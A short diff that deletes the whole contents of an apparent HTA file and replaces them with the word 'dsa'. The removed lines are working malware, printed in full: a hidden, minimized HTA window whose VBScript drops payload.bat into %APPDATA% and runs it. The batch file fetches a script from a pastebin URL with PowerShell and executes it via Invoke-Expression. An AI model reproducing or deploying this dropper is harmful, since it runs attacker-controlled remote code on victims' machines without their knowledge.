@@ -1,12 +1,1 @@
-<script language="VBScript">
-Dim fso, stream
-set shell = CreateObject("WScript.Shell")
-strHomeFolder = shell.ExpandEnvironmentStrings("%APPDATA%")
-Set fso = CreateObject("Scripting.FileSystemObject")
-Set stream = fso.CreateTextFile(strHomeFolder & "\payload.bat")
-stream.Write "powershell.exe Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/9h5E6wph')"
-stream.Close
-shell.Run strHomeFolder & "\payload.bat"
-</script>
-<hta:application id="oHTA" applicationname="App" BORDER="no" CAPTION="no" SHOWINTASKBAR="no" WINDOWSTATE="minimize">
-</hta:application>
+dsa
